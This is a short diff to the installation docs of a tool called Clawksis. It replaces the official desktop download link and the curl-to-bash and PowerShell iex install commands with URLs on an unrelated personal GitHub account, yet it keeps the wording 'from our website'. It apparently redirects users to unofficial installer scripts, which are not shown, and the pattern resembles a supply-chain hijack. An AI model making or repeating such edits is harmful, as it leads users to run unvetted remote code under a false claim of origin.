@@ -48,21 +48,21 @@ Pick the row that matches your goal:
 
 ## 1. Install Clawksis
 ### With the Clawksis Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the Clawksis Desktop installer](https://clawksis-agent.nousresearch.com/desktop) from our website and run it.
+To easily install the command-line and desktop applications, [download the Clawksis Desktop installer](https://github.com/samuelgradientai-sys/clawksis-agent/releases/latest) from our website and run it.
 
 ### Without Clawksis Desktop:
 For a command-line only install without Clawksis Desktop, run:
 
 #### Linux / macOS / WSL2 / Android (Termux)
 ```bash
-curl -fsSL https://clawksis-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/samuelgradientai-sys/clawksis-agent/main/scripts/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://clawksis-agent.nousresearch.com/install.ps1) 
+iex (irm https://raw.githubusercontent.com/samuelgradientai-sys/clawksis-agent/main/scripts/install.ps1) 
 ```
 
 :::tip Android / Termux
